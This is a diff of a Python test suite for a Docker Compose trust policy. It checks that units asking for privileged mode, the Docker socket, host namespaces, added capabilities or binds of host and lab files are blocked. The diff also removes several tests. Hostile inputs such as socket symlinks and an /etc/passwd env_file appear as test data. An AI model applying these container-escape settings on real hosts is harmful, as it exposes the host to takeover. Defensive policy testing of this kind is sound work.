@@ -61,23 +61,13 @@ class Golden(Case):
             arguments["unit"]["meta"]["host_access"] = {service: "Because it must" for service in arguments["own"]}
         return self.changed(name, edit, **more)
 
-    def fires(self, name, code, line=None, **more):
-        verdict = self.judge(name, **more)
-        self.assertEqual(verdict["state"], "blocked", f"{name}: {verdict['reasons']}")
-        self.assertIn(code, verdict["codes"], f"{name}: {verdict['codes']}")
-        if line:
-            self.assertIn(line, verdict["reasons"])
-        return verdict
+    def clean(self, keys, **more):
+        """The verdict of the clean add-on with `keys` set on its service."""
+        return self.changed(CLEAN, lambda arguments: arguments["unit_config"]["services"]["hostile-clean"].update(keys), **more)
 
-    def silent(self, name, code, **more):
-        verdict = self.judge(name, **more)
-        self.assertNotIn(code, verdict["codes"], f"{name}: {verdict['reasons']}")
-        return verdict
-
-    def ok(self, name, **more):
-        verdict = self.judge(name, **more)
-        self.assertEqual((verdict["state"], verdict["reasons"]), ("ok", []), name)
-        return verdict
+    def unit(self, name, keys, **more):
+        """The verdict of a golden unit with `keys` set on what judge reads of it."""
+        return self.changed(name, lambda arguments: arguments["unit"].update(keys), **more)
 
 
 line = trust.line
@@ -97,46 +87,11 @@ class Catalog(Case):
             with self.subTest(unit=name):
                 self.assertEqual(list(regen.load(name)["files"].values()), [text], "capture again: regen.py")
 
-    def test_goldens_were_captured_by_compose_5(self):
-        self.assertRegex(regen.load("core")["_capture"]["compose"], r"^5\.")
-
     def test_a_capture_runs_with_nothing_of_the_shell_but_a_path(self):
         self.assertEqual(sorted(regen._environment()), ["DOCKER_CONFIG", "HOME", "PATH"])
         with mock.patch.dict(os.environ, {"AWS_SECRET_ACCESS_KEY": "x", "GRAVITEE_LICENSE": "y", "COMPOSE_PROFILES": "z", "HOME": "/home/real"}):
             self.assertEqual(regen._environment()["HOME"], regen.FAKE_HOME)
             self.assertNotIn("GRAVITEE_LICENSE", regen._environment())
-
-    def test_a_capture_names_nothing_the_maintainer_has_set(self):
-        """A variable of the shell that a unit reads would be interpolated into the golden, and committed. Skipped, and said,
-        without the Compose that captured them."""
-        installed, captured = regen.version(), regen.load("core")["_capture"]["compose"]
-        if installed != captured:
-            reason = f"skipped: the goldens come from Compose {captured}, {'this is ' + installed if installed else 'none is installed'}"
-            print(reason, file=sys.stderr)
-            self.skipTest(reason)
-        secrets = {"AWS_SECRET_ACCESS_KEY": "aws-secret-in-the-shell", "GRAVITEE_LICENSE": "license-in-the-shell",
-                   "INTERNAL_API_PASSWORD": "password-in-the-shell", "HOSTILE_DEMO_PASSWORD": "demo-in-the-shell"}
-        with mock.patch.dict(os.environ, secrets):
-            found = regen.fresh(("t20-passthrough", "p-clean-playground"))
-        for value in secrets.values():
-            self.assertNotIn(value, json.dumps(found))
-        self.assertEqual(found["core"], regen.load("core"))
-        self.assertEqual(found["t20-passthrough"], regen.load("t20-passthrough"))
-
-    def test_goldens_are_what_compose_gives_now(self):
-        """A few units, captured again: Compose reads files and needs no daemon. Skipped, and said, without the Compose that
-        captured them: another version prints other keys, and the policy fails closed on those."""
-        installed, captured = regen.version(), regen.load("core")["_capture"]["compose"]
-        if installed != captured:
-            reason = f"skipped: the goldens come from Compose {captured}, {'this is ' + installed if installed else 'none is installed'}"
-            print(reason, file=sys.stderr)
-            self.skipTest(reason)
-        sample = ("t03-privileged", "t12-bind-writable", "t14-external-volume", "t17-all-interfaces", "t27-unreadable", "p-pair",
-                  "n02-seed-reads-token")
-        found = regen.fresh(sample)
-        for name in sample:
-            with self.subTest(unit=name):
-                self.assertEqual(found[name], regen.load(name), "capture again: regen.py")
 
     def test_no_golden_names_a_path_of_the_machine_that_captured_it(self):
         for path in sorted(regen.GOLDEN.glob("*.json")):
@@ -145,21 +100,13 @@ class Catalog(Case):
                 for pattern in (r"/Users/", r"/private/", r"/var/folders", r"/tmp/", r"/home/(?!hostile)"):
                     self.assertIsNone(re.search(pattern, text), pattern)
 
-    def test_no_file_of_the_hostile_data_names_a_real_item_or_a_real_address(self):
-        """The real items are the folders the engine holds today and every id of $LAB_REAL_ITEMS (the default catalog's index,
-        in the nightly job); an address in the data ends in .invalid, is this machine or is a service of the platform."""
-        engine = regen.ENGINE
-        real = {re.sub(r"\.yml$", "", entry.name) for folder in ("addons", "setups", "playgrounds") if (engine / folder).is_dir()
-                for entry in (engine / folder).iterdir() if entry.name not in ("local", "README.md", "AGENTS.md", "CLAUDE.md")}
-        real |= {item for item in os.environ.get("LAB_REAL_ITEMS", "").split(",") if item}
+    def test_no_file_of_the_hostile_data_names_a_real_address(self):
+        """An address in the data ends in .invalid, is this machine or is a service of the platform."""
         texts = {path.name: path.read_text(encoding="utf-8") for path in regen.CATALOG.rglob("*") if path.is_file()}
         texts.update({name + ".json": json.dumps({key: regen.load(name)[key] for key in ("unit", "files", "own")})
                       for name in regen.names()})   # the platform's own services, in the captured configuration, are not the data
         texts["expected-hostile.json"] = regen.EXPECTED.read_text(encoding="utf-8")
         for file, text in texts.items():
-            for name in sorted(real):
-                with self.subTest(file=file, name=name):
-                    self.assertIsNone(re.search(rf"(?<![\w-]){re.escape(name)}(?![\w-])", text))
             for host in re.findall(r"(?:https?|git|ssh)://(?:[^/@\s\"']*@)?([^/:\s\\\"'?#]+)|git@([^:\s\\\"']+):", text):
                 host = host[0] or host[1]
                 with self.subTest(file=file, host=host):
@@ -180,178 +127,33 @@ class Catalog(Case):
         with tempfile.TemporaryDirectory() as holder:
             self.assertEqual(regen.expected(holder), wanted, "regen.py --expected, then read the diff")
 
-    def test_the_oracle_is_the_lines_of_the_policy(self):
-        wanted = json.loads(regen.EXPECTED.read_text(encoding="utf-8"))
-        known = {trust.RULES[code]["lines"][variant] for code in trust.RULES for variant in range(len(trust.RULES[code]["lines"]))}
-        for name, entry in wanted.items():
-            for reason in entry["reasons"] + entry.get("when_listed", []):
-                with self.subTest(unit=name, reason=reason):
-                    self.assertTrue(any(re.fullmatch(re.sub(r"\\\{\w+\\\}", ".+", re.escape(text)), reason) for text in known))
-
-
-# The standard's 6.10 (catalog-governance.md), T01 to T27, word for word: what CI and the command line say after a reason
-SPEC_FIXES = {
-    "T01": "Remove `{key}`, or ask the Lab's maintainers to support it.",
-    "T02": "Remove `{key}`, or ask the Lab's maintainers to support it.",
-    "T03": "Remove `privileged`: a demo that needs it is a personal item.",
-    "T04": "Remove `use_api_socket`.",
-    "T05": "Remove `provider`; use a container.",
-    "T06": "Publish a port on 127.0.0.1 instead of sharing the host's network, processes or memory.",
-    "T07": "Remove `cap_add`; run the image as it is meant to run.",
-    "T08": "Remove `devices`, `gpus`, `runtime` and device reservations.",
-    "T09": "Keep only `no-new-privileges` in `security_opt`; remove `sysctls`.",
-    "T10": "Remove the mount of the Docker socket.",
-    "T11": "Move the files under the unit's folder, or use a named volume.",
-    "T12": "Mount it `:ro`, or put the data under `.state/`.",
-    "T13": "Use a named volume the unit declares itself.",
-    "T14": "Use a named volume the unit declares itself.",
-    "T15": "Attach the service to `internal` or `edge` only.",
-    "T16": "Point `file:` at a file inside the unit.",
-    "T17": "Write the port as `127.0.0.1:HOST:CONTAINER`.",
-    "T18": "Put the build context under the unit, pin a remote context to a 40-character commit after `#`, and remove ssh, "
-           "secrets and cache options. Only `context`, `dockerfile`, `args`, `target` and `labels` are accepted (default-deny; "
-           "`additional_contexts` only for the Lab's seeder).",
-    "T19": "Use a relative path inside the catalog.",
-    "T20": "Prefix the setting with `{NS}_`, or read only `*_VERSION`, `*_REGISTRY`, `*_PULL_POLICY` and the shared settings.",
-    "T21": "Prefix service, container and volume names with the catalog id.",
-    "T22": "On a platform service, set only `environment`, `extra_hosts`, `depends_on`, `labels`, read-only binds from your "
-           "folder and loopback ports.",
-    "T23": "Include only units of the default catalog, of this catalog, or of catalogs declared in `requires.catalogs`.",
-    "T24": "A Public catalog cannot include a Private one: move the shared part to a Public catalog.",
-    "T25": "Fix {name} first.",
-    "T26": "Remove what this Gravitee Lab does not read, or check with the Gravitee Lab release that reads it "
-           "(`catalog.py upgrade --lab-ref latest`). A `lab` is for older Gravitee Labs: `catalog.py upgrade --write` "
-           "writes the one of `catalog.yml`.",
-    "T27": "Run `docker compose -f {file} config` and fix what it prints.",
-}
-
 
 class Fixes(Case):
-    """trust.FIXES (the standard's 6.10): the fix that CI and the command line say after the reason of a rule, and `fix`, which
-    fills its blanks. The popover of the Lab keeps the reason lines alone."""
+    """trust.FIXES (the standard's 6.10): the fix that CI and the command line say after the reason of a rule."""
 
     def test_every_rule_of_the_policy_has_a_fix_and_there_is_none_for_another(self):
         self.assertEqual(sorted(trust.FIXES), sorted(trust.RULES))
-        for code in trust.RULES:
-            with self.subTest(code=code):
-                self.assertIsInstance(trust.FIXES[code], str)
-                self.assertTrue(trust.FIXES[code].strip())
 
-    def test_t01_to_t27_are_the_words_of_the_standard(self):
-        self.assertEqual({code: trust.FIXES[code] for code in SPEC_FIXES}, SPEC_FIXES)
-        self.assertEqual(sorted(SPEC_FIXES), [f"T{number:02d}" for number in range(1, 28)])
-
-    def test_the_rules_the_standard_does_not_table_have_a_fix_of_the_same_kind(self):
-        self.assertEqual(sorted(set(trust.FIXES) - set(SPEC_FIXES)), ["N01", "N02", "N03", "N04", "N05", "T28", "T29"])
-        for code in ("T28", "T29", "N01", "N02", "N03", "N04", "N05"):
-            self.assertRegex(trust.FIXES[code], r"^[A-Z].*\.$", code)
-
-    def test_a_fix_is_a_plain_sentence(self):
-        for code, text in trust.FIXES.items():
-            with self.subTest(code=code):
-                self.assertTrue(text.isascii(), "no middle dot, no symbol")
-                self.assertTrue(text.isprintable())
-                self.assertEqual(text, text.strip())
-                self.assertTrue(text[0].isupper(), "sentence case")
-                self.assertTrue(text.endswith("."))
-                self.assertNotIn("Fix:", text, "the clause that says it adds the word")
-                self.assertNotIn("  ", text)
-                self.assertLessEqual(len(text), 300)
-                self.assertNotIn("\u00b7", text)
-
-    def test_no_fix_names_a_place_the_lab_keeps_its_own_files_in(self):
-        """A git install is read only and the author who reads a fix has no such folder: the fix names the catalog's own files."""
-        for code, text in trust.FIXES.items():
-            with self.subTest(code=code):
-                self.assertNotIn(".lab", text)
-                self.assertNotIn("catalogs/", text.replace("requires.catalogs", ""))
-                self.assertNotRegex(text, r"(?<![\w`])/(?:Users|home|private|tmp|var|etc|root)\b")
-                self.assertNotIn("lab-ui", text)
-
-    def test_the_only_blanks_are_the_ones_fix_fills(self):
+    def test_the_only_blanks_are_the_ones_a_caller_fills(self):
         found = {code: set(re.findall(r"\{(\w+)\}", text)) for code, text in trust.FIXES.items()}
         self.assertEqual({code: names for code, names in found.items() if names},
                          {"T01": {"key"}, "T02": {"key"}, "T20": {"NS"}, "T25": {"name"}, "T27": {"file"}})
-
-    def test_a_blank_is_filled_with_what_the_caller_knows_and_left_as_written_otherwise(self):
-        self.assertEqual(trust.fix("T26", min=1, max=2), trust.FIXES["T26"], "it names no level")
-        self.assertEqual(trust.fix("T01", key="frobnicate"), "Remove `frobnicate`, or ask the Lab's maintainers to support it.")
-        self.assertEqual(trust.fix("T20", NS="ACME"), trust.FIXES["T20"].replace("{NS}", "ACME"))
-        self.assertEqual(trust.fix("T27", file="addons/x/compose.yml"),
-                         "Run `docker compose -f addons/x/compose.yml config` and fix what it prints.")
-        self.assertEqual(trust.fix("T25", name="Echo"), "Fix Echo first.")
-        self.assertEqual(trust.fix("T03"), trust.FIXES["T03"])
-        self.assertEqual(trust.fix("T01", other="x"), trust.FIXES["T01"], "a field no blank names is not used")
-
-    def test_the_setting_prefix_is_the_namespace_as_the_lab_spells_it(self):
-        self.assertEqual(trust.fix("T20", ns="acme-hub"), trust.FIXES["T20"].replace("{NS}", "ACME_HUB"))
-        self.assertEqual(trust.fix("T20", NS="ACME"), trust.FIXES["T20"].replace("{NS}", "ACME"))
-        self.assertEqual(trust.fix("T20", NS="MINE", ns="acme-hub"), trust.FIXES["T20"].replace("{NS}", "MINE"))
-        self.assertEqual(trust.fix("T20", ns=3), trust.FIXES["T20"], "not a namespace")
-
-    def test_what_an_author_wrote_is_cleaned_and_cut_and_is_never_read_as_a_blank(self):
-        self.assertEqual(trust.fix("T01", key="a\n::error::b\x1b[31m"), "Remove `a ::error::b [31m`, or ask the Lab's maintainers to support it.")
-        self.assertEqual(trust.fix("T25", name="{name} {min} {0} {x.y} %s {}"), "Fix {name} {min} {0} {x.y} %s {} first.",
-                         "a value is put in once and not read again")
-        long = trust.fix("T01", key="k" * 1000000)
-        self.assertLess(len(long), 400)
-        self.assertEqual(trust.fix("T25", name="  Echo \t two  "), "Fix Echo two first.")
-
-    def test_fix_changes_nothing_it_is_handed(self):
-        before = dict(trust.FIXES)
-        fields = {"ns": "acme-hub", "key": "k"}
-        trust.fix("T20", **fields)
-        self.assertEqual(fields, {"ns": "acme-hub", "key": "k"})
-        self.assertEqual(trust.FIXES, before)
-
-    def test_an_unknown_code_is_a_key_error_as_for_the_reason_lines(self):
-        for code in ("T99", "ST01", "t03", "", None):
-            with self.subTest(code=code), self.assertRaises(KeyError):
-                trust.fix(code)
-        with self.assertRaises(KeyError):
-            trust.line("T99")
 
     def test_a_fix_said_after_its_reason_makes_one_message_of_the_standard(self):
         for code, rule in trust.RULES.items():
             for variant, reason in enumerate(rule["lines"]):
                 blanks = {name: "x" for name in re.findall(r"[{](\w+)[}]", reason)}
-                said = f"{trust.line(code, variant, **blanks)}. Fix: {trust.fix(code)}"
+                said = f"{trust.line(code, variant, **blanks)}. Fix: {trust.FIXES[code]}"
                 with self.subTest(code=code, variant=variant):
                     self.assertEqual(said.count("Fix:"), 1)
                     self.assertNotIn("..", said)
                     self.assertNotIn(". .", said)
 
-    def test_the_long_form_of_a_rule_says_the_fix_the_policy_does(self):
-        """`catalog.py explain` prints the table of the policy with the fix of FIXES (explain.py)."""
-        from lab_ui.catalogs import explain
-        table = explain.table()
-        for code in trust.RULES:
-            with self.subTest(code=code):
-                self.assertIn(trust.FIXES[code], table[code].message)
-
-    def test_the_popover_of_the_lab_keeps_the_reason_lines_alone(self):
-        for code, rule in trust.RULES.items():
-            for text in rule["lines"]:
-                with self.subTest(code=code, line=text):
-                    self.assertNotIn("Fix", text)
-                    self.assertNotIn(trust.FIXES[code], text)
-
 
 class Allowance(Case):
-    """host_ok: milestone M1 counts the list alone, M2 the allowance of the person too."""
+    """host_ok: the list, or the allowance of the person."""
 
-    def test_m1_only_a_listed_catalog_may_use_this_machine(self):
-        with mock.patch.object(trust, "ALLOWANCE", False):
-            self.assertTrue(trust.host_ok(True))
-            self.assertTrue(trust.host_ok(True, {"host": False}))
-            self.assertFalse(trust.host_ok(False))
-            self.assertFalse(trust.host_ok(False, {"host": True}))
-            self.assertFalse(trust.host_ok(None, None))
-
-    def test_the_allowance_is_on(self):
-        self.assertTrue(trust.ALLOWANCE)
-
-    def test_m2_the_allowance_of_the_person_is_honored_when_it_is_exactly_true(self):
+    def test_the_allowance_of_the_person_is_honored_when_it_is_exactly_true(self):
         self.assertTrue(trust.host_ok(False, {"host": True}))
         self.assertTrue(trust.host_ok(True))
         for entry in (None, {}, {"host": False}, {"host": "true"}, {"host": 1}, {"host": None}, "host", ["host"]):
@@ -360,15 +162,6 @@ class Allowance(Case):
 
 
 class Keys(Golden):
-
-    def test_t01_an_unknown_service_key_blocks(self):
-        verdict = self.fires("t01-unknown-service-key", "T01", line("T01", key="models"))
-        self.assertEqual(verdict["codes"], ["T01"])
-
-    def test_t01_a_known_key_and_a_key_of_the_host_class_do_not(self):
-        self.silent(CLEAN, "T01")
-        for name in ("t03-privileged", "t07-cap-add", "t08-devices", "t09-security-opt"):
-            self.assertNotIn("T01", self.judge(name)["codes"], name)
 
     def test_t01_any_key_it_does_not_know_blocks_and_an_extension_does_not(self):
         def key(value):
@@ -381,33 +174,12 @@ class Keys(Golden):
         for absent in ("volumes_from", "models", "post_start", "pre_stop", "develop", "extends", "env_file", "label_file"):
             self.assertNotIn(absent, trust.SERVICE_KEYS)
             self.assertNotIn(absent, trust.HOST_KEYS)
-        self.assertEqual(trust.FILE_KEYS, ("env_file", "label_file"))
         self.assertFalse(trust.SERVICE_KEYS & trust.HOST_KEYS)
 
-    def test_t19_the_files_the_json_still_names_are_judged_by_their_real_place(self):
-        """With `config --no-env-resolution` an env_file is a path in the JSON, not yet merged into the environment, and a link in
-        the unit's folder that leads out of it can be seen there and nowhere else."""
-        folder = self.root / ".lab/catalogs/hostile/addons/p-clean-addon"
-        folder.mkdir(parents=True)
-        outside = self.root / "outside.env"
-        outside.write_text("X=1\n")
-        os.symlink(outside, folder / "linked.env")
-        (folder / "own.env").write_text("X=1\n")
-        unit = str(folder)
-        for entries, state in (([unit + "/own.env"], "ok"), ([{"path": unit + "/own.env", "required": False}], "ok"), ("own.env", "ok"),
-                               ([unit + "/own.env", unit + "/linked.env"], "blocked"), ([{"path": unit + "/linked.env"}], "blocked"),
-                               ([str(outside)], "blocked"), ([unit + "/../x.env"], "blocked"), ([{"required": False}], "blocked"),
-                               ([None], "blocked"), ([7], "blocked"), ("/etc/passwd", "blocked"), ([], "ok"), (None, "ok")):
-            for key in trust.FILE_KEYS:
-                def edit(arguments, entries=entries, key=key):
-                    arguments["unit_config"]["services"]["hostile-clean"][key] = entries
-                with self.subTest(entries=entries, key=key):
-                    verdict = self.changed(CLEAN, edit)
-                    self.assertEqual(verdict["state"], state, verdict["reasons"])
-                    self.assertEqual(verdict["reasons"], [] if state == "ok" else [line("T19", 1)])
-        def not_followed(arguments):
-            arguments["unit_config"]["services"]["hostile-clean"]["env_file"] = [unit + "/linked.env"]
-        self.assertEqual(self.changed(CLEAN, not_followed, realpath=None)["state"], "ok")   # as written, a link passes: the caller hands in realpath
+    def test_t01_a_file_the_screen_missed_and_the_json_still_names_blocks(self):
+        """With `config --no-env-resolution` an env_file is a path in the JSON, whatever the screen read of the text."""
+        for key in ("env_file", "label_file"):
+            self.assertEqual(self.clean({key: ["own.env"]})["reasons"], [line("T01", key=key)])
 
     def test_t01_a_key_on_what_it_overlays_is_judged_too(self):
         def edit(arguments):
@@ -423,14 +195,10 @@ class Keys(Golden):
         self.assertIn(line("T01", key="services"), verdict["reasons"])
 
     def test_t02_an_unknown_top_level_key_blocks(self):
-        def edit(arguments):
-            arguments["unit_config"]["models"] = {"m": {}}
-        self.assertIn(line("T02", key="models"), self.changed(CLEAN, edit)["reasons"])
+        self.assertIn(line("T02", key="models"), self.changed(CLEAN, lambda arguments: arguments["unit_config"].update(models={"m": {}}))["reasons"])
 
     def test_t02_the_keys_of_a_file_and_the_extensions_do_not(self):
-        def edit(arguments):
-            arguments["unit_config"]["x-anchor"] = {"a": 1}
-        self.assertEqual(self.changed(CLEAN, edit)["state"], "ok")
+        self.assertEqual(self.changed(CLEAN, lambda arguments: arguments["unit_config"].update({"x-anchor": {"a": 1}}))["state"], "ok")
         self.assertEqual(sorted(trust.TOP_KEYS), ["configs", "name", "networks", "secrets", "services", "volumes"])
 
 
@@ -479,52 +247,25 @@ class ClassH(Golden):
             with self.subTest(declaration=declaration):
                 self.assertIn("T28", self.changed("t03-privileged", edit, listed=True)["codes"])
 
-    def test_the_default_catalog_is_judged_like_any_other(self):
-        verdict = self.judge("t03-privileged", listed=True)
-        self.assertEqual((verdict["state"], verdict["codes"]), ("blocked", ["T28"]))
-
-    def test_t03_fails_without_the_catalog_and_passes_with_the_catalog_and_a_declaration(self):
-        self.fires("t03-privileged", "T03", line("T03"))
-        self.assertEqual(self.judge("h-privileged-declared", listed=True)["state"], "ok")
-        self.assertEqual(self.judge("h-privileged-declared")["reasons"], [line("T03")])
-
-    def test_t03_a_privileged_build_is_privileged_too(self):
-        def edit(arguments):
-            arguments["unit_config"]["services"]["hostile-clean"]["build"] = {"context": arguments["roots"]["unit"], "privileged": True}
-        self.assertIn(line("T03"), self.changed(CLEAN, edit)["reasons"])
-
-    def test_t04_to_t05_the_docker_api_and_a_program_of_the_host(self):
-        self.fires("t04-api-socket", "T04", line("T04"))
-        self.fires("t05-provider", "T05", line("T05"))
-        self.assertEqual(self.declared("t04-api-socket", listed=True)["state"], "ok")
-        self.assertEqual(self.declared("t05-provider", listed=True)["state"], "ok")
-        def edit(arguments):
-            arguments["unit_config"]["services"]["hostile-clean"]["use_api_socket"] = False
-        self.assertEqual(self.changed(CLEAN, edit)["state"], "ok")
+    def test_t04_a_docker_api_turned_off_is_none(self):
+        self.assertEqual(self.clean({"use_api_socket": False})["state"], "ok")
 
     def test_t06_the_first_namespace_it_shares_is_the_line(self):
-        self.fires("t06-host-network", "T06", line("T06", 0))
         for key, variant in (("pid", 1), ("ipc", 2), ("uts", 3), ("userns_mode", 3), ("cgroup", 3), ("cgroup_parent", 3)):
             def edit(arguments, key=key):
                 service = arguments["unit_config"]["services"]["hostile-clean"]
                 service[key] = "x" if key == "cgroup_parent" else "host"
             with self.subTest(key=key):
                 self.assertEqual(self.changed(CLEAN, edit)["reasons"], [line("T06", variant)])
-        def other(arguments):
-            arguments["unit_config"]["services"]["hostile-clean"]["pid"] = "container:abc"
-        self.assertEqual(self.changed(CLEAN, other)["reasons"], [line("T06", 1)])
-        def fine(arguments):
-            arguments["unit_config"]["services"]["hostile-clean"].update(ipc="shareable", pid="private")
-        self.assertEqual(self.changed(CLEAN, fine)["state"], "ok")
+        self.assertEqual(self.clean({"pid": "container:abc"})["reasons"], [line("T06", 1)])
+        self.assertEqual(self.clean(dict(ipc="shareable", pid="private"))["state"], "ok")
 
     def test_t06_the_processes_and_memory_of_a_container_of_the_platform_are_no_one_s_to_join(self):
         for key, variant in (("pid", 1), ("ipc", 2)):
-            def edit(arguments, key=key):
-                arguments["unit_config"]["services"]["hostile-clean"][key] = "service:mongodb"
             with self.subTest(key=key):
-                self.assertEqual(self.changed(CLEAN, edit)["reasons"], [line("T06", variant)])
+                self.assertEqual(self.clean({key: "service:mongodb"})["reasons"], [line("T06", variant)])
                 self.assertEqual(self.declared(CLEAN, listed=True)["state"], "ok")
-                joined = self.changed(CLEAN, edit, listed=True)
+                joined = self.clean({key: "service:mongodb"}, listed=True)
                 self.assertEqual(joined["reasons"], [line("T28", service="hostile-clean")])
         def own(arguments):
             arguments["unit_config"]["services"]["hostile-clean"].update(pid="service:hostile-clean-sidecar", ipc="service:redis")
@@ -539,36 +280,21 @@ class ClassH(Golden):
         self.assertEqual(item["what"], ["shares the processes of another container"])
 
     def test_t07_capabilities_to_add_but_not_to_drop(self):
-        self.fires("t07-cap-add", "T07", line("T07"))
-        def edit(arguments):
-            arguments["unit_config"]["services"]["hostile-clean"]["cap_drop"] = ["ALL"]
-        self.assertEqual(self.changed(CLEAN, edit)["state"], "ok")
+        self.assertEqual(self.clean({"cap_drop": ["ALL"]})["state"], "ok")
 
     def test_t08_a_device_a_rule_a_gpu_a_runtime_and_a_reservation(self):
-        self.fires("t08-devices", "T08", line("T08"))
         for key, value in (("device_cgroup_rules", ["c 1:3 mr"]), ("gpus", [{"count": -1}]), ("runtime", "nvidia"),
                            ("deploy", {"resources": {"reservations": {"devices": [{"driver": "nvidia"}]}}})):
-            def edit(arguments, key=key, value=value):
-                arguments["unit_config"]["services"]["hostile-clean"][key] = value
             with self.subTest(key=key):
-                self.assertEqual(self.changed(CLEAN, edit)["reasons"], [line("T08")])
-        def fine(arguments):
-            arguments["unit_config"]["services"]["hostile-clean"]["deploy"] = {"resources": {"limits": {"cpus": "1"}}}
-        self.assertEqual(self.changed(CLEAN, fine)["state"], "ok")
+                self.assertEqual(self.clean({key: value})["reasons"], [line("T08")])
+        self.assertEqual(self.clean({"deploy": {"resources": {"limits": {"cpus": "1"}}}})["state"], "ok")
 
     def test_t09_only_no_new_privileges_is_not_a_lowering(self):
-        self.fires("t09-security-opt", "T09", line("T09"))
         for option in ("no-new-privileges", "no-new-privileges:true", "No-New-Privileges=true"):
-            def edit(arguments, option=option):
-                arguments["unit_config"]["services"]["hostile-clean"]["security_opt"] = [option]
             with self.subTest(option=option):
-                self.assertEqual(self.changed(CLEAN, edit)["state"], "ok")
-        def lowered(arguments):
-            arguments["unit_config"]["services"]["hostile-clean"]["security_opt"] = ["no-new-privileges:false"]
-        self.assertEqual(self.changed(CLEAN, lowered)["reasons"], [line("T09")])
-        def kernel(arguments):
-            arguments["unit_config"]["services"]["hostile-clean"]["sysctls"] = {"net.core.somaxconn": "1"}
-        self.assertEqual(self.changed(CLEAN, kernel)["reasons"], [line("T09")])
+                self.assertEqual(self.clean({"security_opt": [option]})["state"], "ok")
+        self.assertEqual(self.clean({"security_opt": ["no-new-privileges:false"]})["reasons"], [line("T09")])
+        self.assertEqual(self.clean({"sysctls": {"net.core.somaxconn": "1"}})["reasons"], [line("T09")])
 
     def test_every_host_key_is_judged_by_a_rule_of_its_own(self):
         """A key the policy lets T01 pass because it is a key of this machine must be blocked by a rule that says what it takes."""
@@ -577,39 +303,27 @@ class ClassH(Golden):
                   "runtime": "nvidia", "cgroup_parent": "parent"}
         self.assertEqual(sorted(sample), sorted(trust.HOST_KEYS))
         for key, value in sample.items():
-            def edit(arguments, key=key, value=value):
-                arguments["unit_config"]["services"]["hostile-clean"][key] = value
             with self.subTest(key=key):
-                blocked = self.changed(CLEAN, edit)
+                blocked = self.clean({key: value})
                 self.assertEqual(len(blocked["reasons"]), 1)
                 self.assertNotIn("T01", blocked["codes"])
-                self.assertEqual(self.changed(CLEAN, edit, listed=True)["codes"], ["T28"])
+                self.assertEqual(self.clean({key: value}, listed=True)["codes"], ["T28"])
 
 
 class Mounts(Golden):
 
     def test_t10_the_docker_socket_by_name_by_link_and_by_pipe(self):
-        self.fires("t10-docker-socket", "T10", line("T10"))
-        def pipe(arguments):
-            arguments["unit_config"]["services"]["hostile-clean"]["volumes"] = [{"type": "npipe", "source": "//./pipe/docker_engine", "target": "/x"}]
-        self.assertEqual(self.changed(CLEAN, pipe)["reasons"], [line("T10")])
-        def renamed(arguments):
-            arguments["unit_config"]["services"]["hostile-clean"]["volumes"] = [
-                {"type": "bind", "source": "/run/docker.sock/", "target": "/x"}]
-        self.assertEqual(self.changed(CLEAN, renamed)["reasons"], [line("T10")])
+        for volume in ({"type": "npipe", "source": "//./pipe/docker_engine", "target": "/x"},
+                       {"type": "bind", "source": "/run/docker.sock/", "target": "/x"}):
+            self.assertEqual(self.clean({"volumes": [volume]})["reasons"], [line("T10")])
 
     def test_t10_a_link_to_the_socket_is_the_socket(self):
         folder = self.root / ".lab/catalogs/hostile/addons/p-clean-addon"
         folder.mkdir(parents=True)
         os.symlink("/var/run/docker.sock", folder / "engine")
-        def edit(arguments):
-            arguments["unit_config"]["services"]["hostile-clean"]["volumes"] = [
-                {"type": "bind", "source": str(folder / "engine"), "target": "/x", "read_only": True}]
-        self.assertEqual(self.changed(CLEAN, edit)["reasons"], [line("T10")])
-        self.assertEqual(self.changed(CLEAN, edit, realpath=None)["state"], "ok")
-
-    def test_t10_passes_without_it(self):
-        self.silent(CLEAN, "T10")
+        engine = {"volumes": [{"type": "bind", "source": str(folder / "engine"), "target": "/x", "read_only": True}]}
+        self.assertEqual(self.clean(engine)["reasons"], [line("T10")])
+        self.assertEqual(self.clean(engine, realpath=None)["state"], "ok")
 
     def test_t01_a_mount_the_policy_cannot_place_is_no_mount(self):
         """A type Compose 5 does not print, or a bind with no source, falls through every branch and passes: default-deny
@@ -632,18 +346,10 @@ class Mounts(Golden):
             service.update(frobnicate=1, volumes=[{"type": "cluster", "source": "a", "target": "/a"}, {"type": "bind", "target": "/b"}])
         self.assertEqual(self.changed(CLEAN, edit)["reasons"], [line("T01", key="frobnicate, volumes.type, volumes.source")])
 
-    def test_t11_a_bind_outside_its_folder_is_a_class_h_finding(self):
-        self.fires("t11-bind-outside", "T11", line("T11"))
-        self.assertNotIn("T11", self.judge("t11-bind-outside", listed=True)["codes"])
-
-    def test_t11_the_folder_of_the_unit_a_plugin_folder_and_the_closure_are_allowed(self):
-        self.silent(CLEAN, "T11")
-        self.ok("h-sibling-bind-ro")
-        def plugins(arguments):
-            arguments["unit_config"]["services"]["hostile-clean"]["volumes"] = [
-                {"type": "bind", "source": str(self.root / "plugins/apim"), "target": "/p"},
-                {"type": "bind", "source": str(self.root / "plugins/am/lib"), "target": "/q", "read_only": True}]
-        self.assertEqual(self.changed(CLEAN, plugins)["state"], "ok")
+    def test_t11_a_plugin_folder_is_allowed(self):
+        self.assertEqual(self.clean({"volumes": [
+            {"type": "bind", "source": str(self.root / "plugins/apim"), "target": "/p"},
+            {"type": "bind", "source": str(self.root / "plugins/am/lib"), "target": "/q", "read_only": True}]})["state"], "ok")
 
     def test_t11_a_unit_of_another_catalog_is_never_a_root(self):
         for name in ("h-cross-catalog-env-ro", "h-cross-catalog-secrets-ro"):
@@ -661,30 +367,26 @@ class Mounts(Golden):
 
     def test_t11_the_files_of_the_lab_are_out_of_reach_whatever_is_declared(self):
         self.assertEqual(self.declared("t11-bind-lab-state", listed=True)["reasons"], [line("T11")])
-        self.assertEqual(self.judge("t11-bind-lab-state", listed=True)["reasons"], [line("T11")])
         for source in ("/", str(self.root), str(self.root.parent), str(self.root / ".lab"), str(self.root / ".lab/catalogs"),
                        str(self.root / ".env"), str(self.root / ".lab/catalogs/partner/addons/ledger/secrets")):
-            def edit(arguments, source=source):
-                arguments["unit_config"]["services"]["hostile-clean"]["volumes"] = [{"type": "bind", "source": source, "target": "/x", "read_only": True}]
+            keys = {"volumes": [{"type": "bind", "source": source, "target": "/x", "read_only": True}]}
             with self.subTest(source=source):
-                self.assertEqual(self.changed(CLEAN, edit, listed=True)["reasons"][:1], [line("T11")])
+                self.assertEqual(self.clean(keys, listed=True)["reasons"][:1], [line("T11")])
 
     def test_t11_what_runs_on_this_machine_is_out_of_reach_too(self):
         """The seeder, the Lab, the core file, the Makefile and the history of the repository: a writable bind of any of them
